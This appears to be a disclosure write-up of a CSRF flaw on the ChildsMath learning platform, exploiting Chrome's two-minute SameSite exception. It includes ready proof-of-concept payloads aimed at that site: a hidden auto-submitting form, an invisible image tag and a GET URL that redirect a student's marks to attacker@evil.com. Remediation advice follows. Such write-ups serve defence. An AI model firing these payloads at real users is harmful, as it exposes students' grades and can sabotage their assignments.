---
title: "Bypassing SameSite Cookie Protection on an Academic Platform via the Lax+2min Window"
date: 2026-02-11
tags: ["csrf", "samesite", "cookie", "web", "childsmath"]
summary: "How Chrome's 'Lax + 2 minute' cookie intervention opened a CSRF window on ChildsMath, a math learning platform used by McMaster University students — letting an attacker silently redirect a student's grades to an attacker-controlled email."
---

## What is ChildsMath?

[ChildsMath](https://www.childsmath.ca) is a web-based mathematics learning platform used in university-level math courses, including at McMaster University. Students use it to complete assignments, practice problems, and receive marks. The platform is PHP-based and handles real academic records — grades, assignment scores, and student contact details.

That context matters for understanding the impact of what I found.

---

## Starting Point

I was looking at the platform from a student's perspective. You log in with your institutional Microsoft account via OAuth, complete assignments, and can have your marks emailed to an alternate address. That last feature — emailing marks — involves a form that POSTs to a server endpoint. That's where things got interesting.

The first question I asked was: does this form have CSRF protection?

I opened Burp, navigated to the marks form, and submitted it while intercepting the traffic. The POST request to `marks.php` had no CSRF token in the body, no custom header, nothing. Just the form fields and the session cookie.

Okay, so no token. But modern browsers have started shipping `SameSite=Lax` as the default for cookies that don't explicitly set a `SameSite` attribute. On a quick check, the session cookie here had no explicit `SameSite` set — so the browser would be applying the Lax default, which should block cross-site POST requests.

Should. That word did a lot of work here.

---

## The Lax + 2 Minute Rule

Here's the wrinkle. When Chrome ships `SameSite=Lax` as the default behavior, it includes a temporary exception sometimes called the **"Lax + 2 minute" rule**. The idea was to give legacy sites time to adapt — so for the first two minutes after a cookie is *created*, Chrome temporarily treats it as `SameSite=None`, making it behave like the old permissive default.

This exception only applies to cookies *without* an explicit `SameSite` attribute. Once you explicitly set `SameSite=Lax`, the exception is gone — no window at all.

So the attack question becomes: can I force the creation of a fresh session cookie?

Yes, via the OAuth flow. If the victim is already signed into their Microsoft account (which most students with Microsoft-issued institutional credentials are), hitting the OAuth authorize endpoint causes the application to issue a new session cookie on redirect. That cookie is now brand new — under 2 minutes old — and Chrome's Lax-by-default protection briefly doesn't apply to it.

If I can trigger a CSRF POST within that window, it goes through.

---

## The Attack

Here's how the full chain worked:

**Step 1 — Cookie refresh (Chrome-specific)**

The attacker's page opens a popup to the Microsoft OAuth authorize endpoint for the target application. This triggers a re-authentication/redirect cycle. The target application issues a fresh session cookie to the victim's browser.

Firefox doesn't enforce the same Lax-by-default policy Chrome does, so the refresh step can be skipped there entirely — the POST goes through immediately. Safari is a different story: it doesn't implement the 2-minute rule at all. There's no timer, no window, no exception. Safari simply never adopted the Lax-by-default behavior in the same way, which means cross-site POST requests work without any cookie refresh step whatsoever. The exploit runs immediately on Safari with zero preconditions beyond the victim being logged in.

**Step 2 — Wait 2 seconds**

Just long enough to let the OAuth redirect complete and the fresh cookie land. The cookie is now <2 minutes old.

**Step 3 — Submit the forged form**

A hidden form targeting `https://www.childsmath.ca/childsa/forms/1zStuff/marks.php` gets submitted automatically:

```html
<form id="csrfForm" method="POST"
  action="https://www.childsmath.ca/childsa/forms/1zStuff/marks.php"
  style="display:none">
  <input type="hidden" name="alternate_email" value="attacker@evil.com">
  <input type="hidden" name="email_marks" value="Email the below marks to me">
</form>
```

Because the cookie is fresh, Chrome treats it as `SameSite=None` and sends it with the cross-site POST. The server sees a valid authenticated request and processes it.

**Step 4 — Grades emailed to the attacker**

The victim's alternate email is now `attacker@evil.com`. When the platform sends a marks summary, it lands in the attacker's inbox.

The popup opened and closed in under 2 seconds. The victim likely saw a brief flicker, if anything at all.

---

## Alternative: GET-Based Attack

After confirming the POST-based PoC worked, I checked whether the endpoint also accepted GET requests with query parameters — and it did. The server processed the same action when the parameters were passed via the URL:

```
https://www.childsmath.ca/childsa/forms/1zStuff/marks.php?alternate_email=attacker@evil.com&email_marks=Email+the+below+marks+to+me
```

This simplifies the attack considerably. GET requests don't need a form — they can be triggered by an `<img>` tag, an `<a href>`, an iframe, a redirect, or anything that causes the browser to fetch a URL. There's no form submission, no button click required from the victim on the attacker's page. Just navigating to a webpage that includes the link (or an invisible image tag pointing at it) is enough to trigger the action.

```html
<!-- Invisible, fires on page load, victim sees nothing -->
<img src="https://www.childsmath.ca/childsa/forms/1zStuff/marks.php?alternate_email=attacker@evil.com&email_marks=Email+the+below+marks+to+me" style="display:none">
```

On Safari, where there's no SameSite enforcement at all, this image tag alone — on any page the victim visits — would silently redirect their grades to the attacker's email. No refresh, no popup, no interaction beyond loading the page.

The fact that a state-changing action accepts GET is a fundamental HTTP semantics violation. GET is supposed to be idempotent and side-effect free. Browsers, proxies, and prefetchers all treat it that way — which is exactly why it's so dangerous here.

---

## What Can an Attacker Actually Do With This?

The marks.php endpoint is the primary PoC, but the vulnerability isn't limited to grade delivery. The underlying issue — no CSRF token, implicit SameSite reliance — likely extends to assignment submission endpoints as well.

That opens up a nastier scenario: an attacker can silently submit incorrect answers on behalf of a victim. If a student only gets three attempts on a problem set and an attacker burns all three with wrong answers before the student has a chance to respond, that student is locked out. Their grade is now a zero on that assignment, and they have no recourse.

Specifically:

- **Grade exfiltration** — redirect marks emails to attacker-controlled address
- **Denial of service on assignments** — exhaust attempts by force-submitting garbage answers
- **Privacy violation** — academic records are sensitive; a student's grade data is not meant for anyone but them and their institution

---

## Root Cause

Two issues combined to make this exploitable:

1. **No anti-CSRF tokens.** The endpoint accepts state-changing POST requests without any token that would prove the request originated from the application's own interface.

2. **Implicit SameSite reliance.** The session cookie doesn't set `SameSite` explicitly. That's the whole problem — once you rely on the browser default, you're at the mercy of browser-specific behaviors and exception windows. The 2-minute rule is a real, documented Chrome behavior, not an obscure edge case.

---

## Remediation

**Anti-CSRF tokens are the right fix.** Generate a per-session (or per-request) token, embed it in forms as a hidden field, and validate it server-side on every POST. If the token is absent or wrong, reject the request. This kills CSRF regardless of browser behavior.

**Explicitly set SameSite=Lax on the session cookie.** Don't let the browser guess. Setting it explicitly removes the 2-minute exception window and makes the protection unconditional. The recommended header:

```
Set-Cookie: PHPSESSID=<value>; SameSite=Lax; Secure; HttpOnly
```

Both fixes are needed. The token defends the application layer; the cookie attribute defends the transport layer. Defense in depth.

---

## Disclosure

Reported to the platform administrators. This post covers the technical details of the vulnerability as found.
